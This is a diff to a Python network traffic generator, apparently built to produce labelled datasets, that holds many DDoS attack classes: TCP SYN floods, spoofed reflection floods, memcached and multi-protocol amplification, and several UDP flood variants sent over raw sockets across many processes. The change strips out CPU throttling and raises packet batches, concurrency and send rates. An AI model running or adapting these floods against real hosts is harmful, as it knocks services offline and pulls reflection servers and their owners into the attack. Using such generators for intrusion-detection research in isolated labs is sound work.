@@ -42,18 +42,6 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-def get_available_cpu_count() -> int:
-    """Get the number of CPU cores available for traffic generation.
-    
-    Uses percentage-based resource allocation instead of core reservation.
-    
-    Returns:
-        Total number of CPU cores
-    """
-
-    total_cores = multiprocessing.cpu_count()
-    # All cores are available, resource limiting is done through throttling
-    return total_cores
 
 class TrafficType(Enum):
     """Enumeration of traffic types supported by the framework."""
@@ -477,7 +465,7 @@ class Attack(ABC):
         pause_event: Optional[Event] = None, 
         min_port: Optional[int] = None, 
         max_port: Optional[int] = None,
-        custom_identifier: Optional[str] = None,  # <--- New parameter
+        custom_identifier: Optional[str] = None  # <--- New parameter
     ):
         """Initialize the attack.
         
@@ -619,16 +607,6 @@ class Attack(ABC):
         """
         return PortStrategy.choose_port(self.min_port, self.max_port)
     
-    async def attack_throttle(self) -> None:
-        """Throttle attack processes to use only 90% of CPU resources, leaving 10% for monitoring."""
-        # More aggressive throttling to reduce CPU usage from 100% to ~90%
-        if random.random() < 0.30:  # 30% chance to sleep
-            await asyncio.sleep(random.uniform(0.01, 0.03))  # 10-30ms sleep
-        elif random.random() < 0.20:  # 20% chance for longer sleep
-            await asyncio.sleep(random.uniform(0.03, 0.08))  # 30-80ms sleep
-        elif random.random() < 0.10:  # 10% chance for even longer sleep
-            await asyncio.sleep(random.uniform(0.08, 0.15))  # 80-150ms sleep
-    
     @abstractmethod
     def run(self) -> None:
         """Run the attack.
@@ -723,10 +701,7 @@ class TCPAttack(Attack):
     
     def start_flood(self) -> None:
         """Start a flood attack using multiple processes."""
-        # Use our core splitting instead of all available cores
-
         num_processes = cpu_count()
-        
         processes = []
         
         for _ in range(num_processes):
@@ -821,11 +796,10 @@ class TCPTraffic(BenignTraffic):
             self.start_time = time.time()
             
         total_duration = self.duration
-        num_processes_per_ip = max(1, min(3, multiprocessing.cpu_count() // len(self.target_ips)))
+        num_processes_per_ip = max(5, multiprocessing.cpu_count() // 2 // len(self.target_ips))
         processes = []
 
         # Create processes for each target IP
-        process_index = 0
         for target_ip in self.target_ips:
             for _ in range(num_processes_per_ip):
                 logger.debug(f"Starting process for target {target_ip}")
@@ -835,7 +809,6 @@ class TCPTraffic(BenignTraffic):
                 )
                 p.start()
                 processes.append(p)
-                process_index += 1
 
         for p in processes:
             p.join()
@@ -866,7 +839,7 @@ class TCPTraffic(BenignTraffic):
                                             pause_event: Event, interface: str) -> None:
         """Simulate both standard load phases and random bursts over an extended period."""
         regions = ['NA', 'EU', 'ASIA', 'SA', 'AF', 'OCEANIA']
-        semaphore = asyncio.Semaphore(20)  # Reduced from 100 to 20 concurrent connections
+        semaphore = asyncio.Semaphore(100)  # Limit to 100 concurrent connections
         tasks = []
 
         async def limited_simulation(task: asyncio.Task) -> None:
@@ -875,31 +848,28 @@ class TCPTraffic(BenignTraffic):
 
         while time.time() - self.start_time < total_duration:
             region = random.choice(regions)
-            if random.random() < 0.02:  # Reduced from 0.05 to 0.02 (2% chance)
+            if random.random() < 0.05:
                 # Simulate burst traffic
                 tasks.append(asyncio.create_task(self.burst_traffic(target_ip, region, pause_event)))
             else:
                 # Simulate standard load phases
                 remaining_time = self.start_time + total_duration - time.time()
-                phase_duration = min(random.randint(300, 600), remaining_time)  # Reduced from 1800-3600 to 300-600
+                phase_duration = min(random.randint(1800, 3600), remaining_time)
                 tasks.append(asyncio.create_task(
                     self.manage_load_phases(target_ip, phase_duration, pause_event)
                 ))
 
-            # Occasionally initiate TCP client simulations (reduced frequency)
-            if random.random() < 0.05:  # Reduced from 0.1 to 0.05 (5% chance)
+            # Occasionally initiate TCP client simulations
+            if random.random() < 0.1:
                 target_port = self.choose_port_strategy()
                 tasks.append(asyncio.create_task(
                     self.simulate_tcp_client(target_ip, target_port, pause_event, interface)
                 ))
 
             # Limit the number of concurrent tasks to prevent overload
-            if len(tasks) > 50:  # Reduced from 1000 to 50
+            if len(tasks) > 1000:
                 done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                 tasks = list(pending)
-
-            # Add CPU throttling - sleep between iterations
-            await asyncio.sleep(0.1)  # 100ms delay between iterations
 
         # Wait for all remaining tasks to complete
         if tasks:
@@ -972,7 +942,7 @@ class TCPTraffic(BenignTraffic):
                                   pause_event: Event, target_ip: str) -> None:
         """Simulate real-world load by sending TCP packets with raw sockets."""
         start_time = time.time()
-        packet_interval = 0.1  # Increased interval to reduce CPU usage (10 packets per second)
+        packet_interval = 0.01  # Interval between packets to limit rate
         
         # Create a raw socket for sending packets
         sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
@@ -1007,14 +977,12 @@ class TCPTraffic(BenignTraffic):
 
                 await asyncio.sleep(packet_interval)
 
-                # Add more frequent idle periods to reduce CPU usage
-                if random.random() < 0.3:  # 30% chance of idle time
-                    idle_time = random.uniform(0.1, 0.5)
+                if random.random() < 0.02:
+                    idle_time = random.uniform(0.01, 0.2)
                     await asyncio.sleep(idle_time)
 
-                # More frequent pause periods
-                if random.randint(0, 1000) < 5:  # 0.5% chance
-                    pause_time = random.uniform(1, 3)
+                if random.randint(0, 10000) < 1:
+                    pause_time = random.uniform(0.5, 2)
                     logger.info(f"Pausing traffic for {pause_time:.2f} seconds for natural idle period...")
                     await asyncio.sleep(pause_time)
         finally:
@@ -1125,11 +1093,11 @@ class UDPTraffic(BenignTraffic):
             self.start_time = time.time()
             
         total_duration = self.duration
-        num_processes_per_ip = max(1, multiprocessing.cpu_count() // 2 // len(self.target_ips))
+        # Update: Use 50% of available CPU cores per target IP
+        num_processes_per_ip = max(1, (multiprocessing.cpu_count() // 2) // len(self.target_ips))
         processes = []
         
         # Create and start processes for each target IP
-        process_index = 0
         for target_ip in self.target_ips:
             for _ in range(num_processes_per_ip):
                 p = multiprocessing.Process(
@@ -1138,7 +1106,6 @@ class UDPTraffic(BenignTraffic):
                 )
                 p.start()
                 processes.append(p)
-                process_index += 1
         
         for p in processes:
             p.join()
@@ -1252,14 +1219,12 @@ class UDPTraffic(BenignTraffic):
                 except OSError as e:
                     logger.error(f"Error sending UDP packet: {e}")
                 
-                # Add more frequent idle periods to reduce CPU usage
-                if random.random() < 0.3:  # 30% chance of idle time
-                    idle_time = random.uniform(0.1, 0.5)
+                if random.random() < 0.02:
+                    idle_time = random.uniform(0.01, 0.2)
                     await asyncio.sleep(idle_time)
                 
-                # More frequent pause periods
-                if random.randint(0, 1000) < 5:  # 0.5% chance
-                    pause_time = random.uniform(1, 3)
+                if random.randint(0, 10000) < 1:
+                    pause_time = random.uniform(0.5, 2)
                     logger.info(f"Pausing UDP traffic for {pause_time:.2f} seconds for natural idle period...")
                     await asyncio.sleep(pause_time)
         finally:
@@ -1306,14 +1271,11 @@ class TCPVariableWindowSYNFlood(TCPAttack):
                 payload, window_size=window_size, flags=flags
             )
             
-            tasks = [self.async_send_packet(sock, packet) for _ in range(1500)]  # Reduced from 3000 to 1500
+            tasks = [self.async_send_packet(sock, packet) for _ in range(3000)]
             await asyncio.gather(*tasks)
             
             base_interval = 1.0 / rate
             await asyncio.sleep(random.uniform(0.8 * base_interval, 1.2 * base_interval))
-            
-            # Throttle attack to leave resources for monitoring
-            await self.attack_throttle()
 
 
 class TCPSYNFloodReflection(TCPAttack):
@@ -1323,7 +1285,6 @@ class TCPSYNFloodReflection(TCPAttack):
         logger.info("Starting TCP Amplified SYN Flood Reflection Attack")
         reflection_ips = [self.generate_random_ip() for _ in range(10)]
         num_processes = cpu_count()
-        
         processes = []
         
         for _ in range(num_processes):
@@ -1362,9 +1323,6 @@ class TCPSYNFloodReflection(TCPAttack):
             tasks = [self.async_send_packet(sock, packet) for _ in range(100)]
             await asyncio.gather(*tasks)
             await asyncio.sleep(0.000001)
-            
-            # Throttle attack to leave resources for monitoring
-            await self.attack_throttle()
 
 
 class TCPAsyncSlowSYNFlood(TCPAttack):
@@ -1373,8 +1331,7 @@ class TCPAsyncSlowSYNFlood(TCPAttack):
     def run(self) -> None:
         logger.info("Starting TCP Async Slow SYN Flood Attack")
         reflection_ips = [self.generate_random_ip() for _ in range(10)]
-        num_processes = cpu_count() * 8
-        
+        num_processes = multiprocessing.cpu_count() * 8
         processes = []
         
         for _ in range(num_processes):
@@ -1430,7 +1387,6 @@ class TCPBatchSYNFlood(TCPAttack):
     def run(self) -> None:
         logger.info("Starting TCP Batch SYN Flood Attack")
         num_processes = cpu_count() * 2
-        
         processes = []
         
         for _ in range(num_processes):
@@ -1599,7 +1555,6 @@ class TCPAdaptiveFlood(TCPAttack):
     def run(self) -> None:
         logger.info("Starting TCP Adaptive Flood Attack")
         num_processes = cpu_count()
-        
         processes = []
         
         for _ in range(num_processes):
@@ -1648,7 +1603,6 @@ class TCPBatchFlood(TCPAttack):
     def run(self) -> None:
         logger.info("Starting TCP Batch Flood Attack")
         num_processes = cpu_count()
-        
         processes = []
         
         for _ in range(num_processes):
@@ -1778,7 +1732,6 @@ class UDPMalformedPacket(UDPAttack):
     def run(self) -> None:
         logger.info("Starting UDP Malformed Packet Flood Attack")
         num_processes = cpu_count() * 2
-        
         processes = []
         
         for _ in range(num_processes):
@@ -1839,7 +1792,6 @@ class UDPMultiProtocolAmplificationAttack(UDPAttack):
     def run(self) -> None:
         logger.info("Starting UDP Multiprotocol Amplification Attack")
         num_processes = cpu_count() * 2
-        
         processes = []
         
         for _ in range(num_processes):
@@ -1899,9 +1851,6 @@ class UDPMultiProtocolAmplificationAttack(UDPAttack):
                     continue
                 
                 await asyncio.sleep(0.00001)
-                
-                # Throttle attack to leave resources for monitoring
-                await self.attack_throttle()
         finally:
             sock.close()
 
@@ -1932,12 +1881,9 @@ class UDPAdaptivePayloadFlood(UDPAttack):
                     continue
                     
                 try:
-                    for _ in range(50):  # Reduced from 100 to 50
+                    for _ in range(100):
                         sock.sendto(packet_bytes, (target_ip, port))
                     await asyncio.sleep(1.0 / rate)
-                    
-                    # Throttle attack to leave resources for monitoring
-                    await self.attack_throttle()
                 except OSError as e:
                     logger.error(f"Error sending packet: {e}")
                     break
@@ -2048,10 +1994,7 @@ class UDPMaxRandomizedFlood(UDPAttack):
         self.start_flood()
     
     def start_flood(self) -> None:
-        # Use our core splitting instead of all available cores
-
         num_processes = cpu_count() * 2
-        
         processes = []
         
         for _ in range(num_processes):
@@ -2136,7 +2079,6 @@ class UDPAndTCPFlood(Attack):
     def run(self) -> None:
         logger.info("Starting UDP and TCP Flood Attack")
         num_processes = cpu_count() * 2
-        
         processes = []
         
         for _ in range(num_processes):
@@ -2234,7 +2176,6 @@ class UDPSingleIPFlood(UDPAttack):
     def run(self) -> None:
         logger.info("Starting UDP Single IP Flood Attack")
         num_processes = cpu_count() * 2
-        
         processes = []
         
         for _ in range(num_processes):
@@ -2299,10 +2240,8 @@ class UDPIpPacket(UDPAttack):
     """Implements a UDP IP Packet Flood attack."""
     
     def run(self) -> None:
-
         logger.info("Starting UDP IP Packet Flood Attack")
         num_processes = cpu_count()
-        
         processes = []
         
         for _ in range(num_processes):
@@ -2429,7 +2368,6 @@ class UDPMemcachedAmplificationAttack(UDPAttack):
     def run(self) -> None:
         logger.info("Starting UDP Memcached Amplification Attack")
         num_processes = cpu_count() * 2
-        
         processes = []
         
         for _ in range(num_processes):
@@ -2521,7 +2459,6 @@ class UDPHybridFlood(UDPAttack):
     def run(self) -> None:
         logger.info("Starting UDP Hybrid Flood Attack")
         num_processes = cpu_count() * 2
-        
         processes = []
         
         for _ in range(num_processes):
@@ -2546,7 +2483,7 @@ class UDPHybridFlood(UDPAttack):
             tasks.append(asyncio.create_task(
                 self.send_packet_batch(self.target_ip, port, payload, rate, pause_event)
             ))
-        
+            
         await asyncio.gather(*tasks, return_exceptions=True)
     
     async def send_packet_batch(self, target_ip: str, port: int, payload: Union[str, bytes], 
@@ -2589,7 +2526,6 @@ class UDPDynamicPayloadFlood(UDPAttack):
     def run(self) -> None:
         logger.info("Starting UDP Dynamic Payload Flood Attack")
         num_processes = cpu_count() * 2
-        
         processes = []
         
         for _ in range(num_processes):
@@ -2665,7 +2601,6 @@ class UDPEncryptedPayloadFlood(UDPAttack):
     def run(self) -> None:
         logger.info("Starting UDP Encrypted Payload Flood Attack")
         num_processes = cpu_count() * 2
-        
         processes = []
         
         for _ in range(num_processes):
@@ -2755,29 +2690,16 @@ def get_attack_classes() -> Dict[str, Type[Attack]]:
 
 
 # NEW helper: Run an attack instance in a new process (used for parallel benign attacks)
-def run_attack_instance(attack_class, target_ips, interface, duration, label_identifier, min_port, max_port, reserved_percentage=20):
-    # Create the attack instance with the required parameters
-    try:
-        attack_instance = attack_class(
-            target_ips=target_ips,
-            interface=interface,
-            duration=duration,
-            pause_event=Event(),
-            custom_identifier=label_identifier,
-            min_port=min_port,
-            max_port=max_port
-        )
-    except TypeError:
-        attack_instance = attack_class(
-            target_ips=target_ips,
-            interface=interface,
-            duration=duration,
-            pause_event=Event(),
-            custom_identifier=label_identifier,
-            min_port=min_port,
-            max_port=max_port
-        )
-    
+def run_attack_instance(attack_class, target_ips, interface, duration, label_identifier, min_port, max_port):
+    attack_instance = attack_class(
+        target_ips=target_ips,
+        interface=interface,
+        duration=duration,
+        pause_event=Event(),
+        custom_identifier=label_identifier,
+        min_port=min_port,
+        max_port=max_port
+    )
     # Mark instance as running in parallel so that traffic shaping is skipped
     attack_instance.parallel = True
     attack_instance.execute()
@@ -2806,67 +2728,68 @@ def main() -> None:
     # Load the playlist from the given JSON file
     try:
         with open(args.playlist, 'r') as file:
-            playlist_data = json.load(file)
+            playlist = json.load(file)
     except Exception as e:
         logger.error(f"Failed to load playlists file: {e}")
         sys.exit(1)
     
-    attack_classes = get_attack_classes()
-    
-    # Process the new playlist structure with separate benign and attack playlists
-    if not isinstance(playlist_data, dict) or "benign_playlist" not in playlist_data or "attack_playlist" not in playlist_data:
-        logger.error("Invalid playlist structure. Expected dictionary with 'benign_playlist' and 'attack_playlist' keys.")
-        sys.exit(1)
-    
-    logger.info("Processing playlist structure with separate benign and attack playlists")
-    
-    # Start benign traffic processes (continuous for full duration)
-    benign_playlist = playlist_data["benign_playlist"]
-    attack_playlist = playlist_data["attack_playlist"]
-    
-    # Start benign traffic processes in parallel
-    benign_processes = []
-    if "classes" in benign_playlist:
-        for sub_entry in benign_playlist["classes"]:
-            attack_class = attack_classes.get(sub_entry["class_vector"].lower())
-            if not attack_class:
-                logger.error(f"Error: Traffic type '{sub_entry['class_vector']}' is not recognized.")
-                continue
-            
-            logger.info(f"Starting continuous benign traffic: {sub_entry['class_vector']} "
-                        f"for {sub_entry.get('duration', 10)} seconds")
-            
-            p = Process(target=run_attack_instance, args=(
-                attack_class,
-                target_ips,
-                args.interface,
-                sub_entry.get("duration", 10),
-                sub_entry.get("label_identifier"),
-                sub_entry.get("min_port", 1),
-                sub_entry.get("max_port", 65535),
-                20  # reserved_percentage default value
-            ))
-            p.start()
-            benign_processes.append(p)
-    
-    # Process attack playlist (intermittent attacks and pauses)
-    current_time = 0
-    for entry in attack_playlist:
-        if entry["name"] == "pause":
-            # Handle pause - just wait for the duration
-            pause_duration = entry.get("duration", 60)
-            logger.info(f"Pausing for {pause_duration} seconds")
-            time.sleep(pause_duration)
-            current_time += pause_duration
+    # NEW: Determine playlist structure.
+    # If any entry has a "classes" key, assume the JSON is in the new parallel benign format.
+    if isinstance(playlist, list):
+        if any("classes" in entry for entry in playlist):
+            playlist_entries = playlist  # Use as is.
         else:
-            # Handle attack
+            # Group by class_vector as before.
+            grouped_playlist = {}
+            for entry in playlist:
+                key = entry.get('class_vector')
+                if key:
+                    grouped_playlist.setdefault(key, []).append(entry)
+            playlist_entries = []
+            for key, entries in grouped_playlist.items():
+                playlist_entries.extend(entries)
+    else:
+        # If not a list, assume it's already grouped.
+        playlist_entries = []
+        for key, entries in playlist.items():
+            playlist_entries.extend(entries)
+    
+    attack_classes = get_attack_classes()
+
+    # Process each entry in the playlist
+    for entry in playlist_entries:
+        # If the entry has a "classes" key, run those benign attacks in parallel.
+        if "classes" in entry:
+            benign_processes = []
+            for sub_entry in entry["classes"]:
+                attack_class = attack_classes.get(sub_entry["class_vector"].lower())
+                if not attack_class:
+                    logger.error(f"Error: Traffic type '{sub_entry['class_vector']}' is not recognized.")
+                    continue
+                logger.info(f"Starting parallel benign traffic generation for: {entry['name']} "
+                            f"({sub_entry['class_vector']}) with duration: {sub_entry.get('duration', 10)} seconds")
+                p = Process(target=run_attack_instance, args=(
+                    attack_class,
+                    target_ips,
+                    args.interface,
+                    sub_entry.get("duration", 10),
+                    sub_entry.get("label_identifier"),
+                    sub_entry.get("min_port", 1),
+                    sub_entry.get("max_port", 65535)
+                ))
+                p.start()
+                benign_processes.append(p)
+            for p in benign_processes:
+                p.join()
+        else:
+            # Standard single attack entry processing.
             attack_class = attack_classes.get(entry["class_vector"].lower())
             if not attack_class:
                 logger.error(f"Error: Traffic type '{entry['class_vector']}' is not recognized.")
                 continue
             
-            logger.info(f"Starting attack: {entry['name']} ({entry['class_vector']}) "
-                        f"for {entry.get('duration', 10)} seconds")
+            logger.info(f"Starting traffic generation for: {entry['name']} "
+                        f"({entry['class_vector']}) with duration: {entry.get('duration', 10)} seconds")
             
             attack_instance = attack_class(
                 target_ips=target_ips,
@@ -2875,14 +2798,9 @@ def main() -> None:
                 pause_event=Event(),
                 custom_identifier=entry.get("label_identifier"),
                 min_port=entry.get("min_port", 1),
-                max_port=entry.get("max_port", 65535),
+                max_port=entry.get("max_port", 65535)
             )
             attack_instance.execute()
-            current_time += entry.get("duration", 10)
-    
-    # Wait for all benign processes to complete
-    for p in benign_processes:
-        p.join()
-
+            
 if __name__ == "__main__":
     main()
